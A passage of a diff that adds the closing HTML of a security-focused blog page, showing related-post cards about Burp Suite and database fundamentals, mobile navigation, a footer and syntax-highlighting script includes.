+          <p class="post-card-summary">Complete guide to Burp Suite Community &amp; Pro — proxy setup, Repeater, Intruder, Scanner, extensions, and real-world web app attack workflows.</p>
+        </div>
+      </a>
+    
+      
+      <a href="/axiom-blog-site/post/databases-fundamentals" class="post-card post-card-related card-cat-learn">
+        <div class="post-card-body">
+          <div class="post-card-toprow">
+            <div class="post-card-badges">
+              
+                <span class="cat-badge cat-learn">Learn</span>
+              
+            </div>
+          </div>
+          <h2 class="post-card-title">Databases — The Complete Foundation</h2>
+          <div class="post-card-meta"><time>2026-06-04</time></div>
+          <p class="post-card-summary">Relational and NoSQL database fundamentals, SQL from scratch, MySQL, PostgreSQL, MSSQL, Oracle, SQLite, MongoDB, Redis, and Cassandra — with red team perspectives on enumeration, default credentials, privilege escalation, credential extraction, and SQL injection for every major engine.</p>
+        </div>
+      </a>
+    
+  </div>
+</section>
+
+
+
+
+    </div>
+  </main>
+
+  <nav class="mobile-bottom-nav">
+    <a href="/axiom-blog-site/" aria-label="Home">
+      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+        <path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/><path d="M9 22V12h6v10"/>
+      </svg>
+      <span>Home</span>
+    </a>
+    <button type="button" id="mobileBottomSearch" aria-label="Search">
+      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+        <circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35"/>
+      </svg>
+      <span>Search</span>
+    </button>
+    <a href="/axiom-blog-site/#categories" aria-label="Categories">
+      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+        <rect x="3" y="3" width="7" height="7" rx="1"/><rect x="14" y="3" width="7" height="7" rx="1"/><rect x="3" y="14" width="7" height="7" rx="1"/><rect x="14" y="14" width="7" height="7" rx="1"/>
+      </svg>
+      <span>Categories</span>
+    </a>
+  </nav>
+
+  <footer class="site-footer">
+    <div class="container">
+      <div class="footer-left">
+        <a href="/axiom-blog-site/" class="footer-brand">Axiom</a>
+      </div>
+      <nav class="footer-nav">
+        <a href="/axiom-blog-site/about" class="footer-link">About</a>
+        <a href="/axiom-blog-site/tags" class="footer-link">Tags</a>
+        <a href="/axiom-blog-site/privacy" class="footer-link">Privacy</a>
+        <a href="/axiom-blog-site/feed.xml" class="footer-link">RSS</a>
+      </nav>
+    </div>
+  </footer>
+
+  <script src="/axiom-blog-site/static/js/highlight.min.js?v=2"></script>
+  <script src="/axiom-blog-site/static/js/hljs-powershell.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-x86asm.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-dos.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-http.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-nginx.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-apache.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-dockerfile.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-armasm.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-awk.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-cmake.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-coffeescript.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-dart.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-elixir.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-erlang.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-fortran.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-fsharp.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-gradle.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-groovy.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-haskell.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-kotlin.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-latex.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-lisp.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-nim.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-nix.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-ocaml.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-pgsql.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-protobuf.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-scala.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-vim.min.js"></script>
+  <script src="/axiom-blog-site/static/js/search.js?v=1"></script>
+  <script src="/axiom-blog-site/static/js/animations.js?v=3"></script>
+  
+  <script src="/axiom-blog-site/static/js/crypto.js?v=2"></script>
+  <script src="/axiom-blog-site/static/js/app.js?v=3"></script>
+  <script src="/axiom-blog-site/static/js/toc.js?v=7"></script>
+  <script src="/axiom-blog-site/static/js/post.js?v=4"></script>
+
+</body>
+</html>
